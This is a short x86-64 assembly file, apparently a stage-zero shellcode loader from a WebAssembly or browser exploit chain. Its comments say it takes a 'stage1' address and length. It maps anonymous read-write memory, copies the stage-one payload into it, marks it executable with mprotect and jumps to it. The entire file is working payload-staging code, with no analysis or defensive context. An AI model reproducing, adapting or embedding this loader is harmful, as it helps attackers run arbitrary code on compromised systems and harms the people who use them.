BITS 64

; wasm arg1 = stage1 address -> rax
; wasm arg2 = stage1 length -> rdx

; save r12, r13, r14
push r12
push r13
push r14

mov r12, rax                     ; stage1 address backup
mov r13, rdx                     ; stage1 length backup

xor rax, rax
xor rdi, rdi                    ; dest
mov rsi, r13                    ; length
mov rdx, 3                      ; prot = PROT_READ | PROT_WRITE
mov r10, 0x22                   ; flags = MAP_PRIVATE | MAP_ANONYMOUS
mov r8, rax                     ; fd
mov r9, rax                     ; offset
mov al, 9
syscall                         ; mmap(0, length, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0)
mov r14, rax

mov rdi, r14                    ; dest
mov rcx, r13                    ; length
mov rsi, r12                    ; addr
rep movsb

mov rdi, r14                    ; dest
mov rsi, r13                    ; length
mov rdx, 5                      ; prot = PROT_READ | PROT_EXECUTE
mov rax, 10
syscall                         ; mprotect(dest, length, PROT_READ | PROT_EXECUTE)

; restore r14, r13, r12, jmp to stage1
mov rax, r14
pop r14
pop r13
pop r12
jmp rax
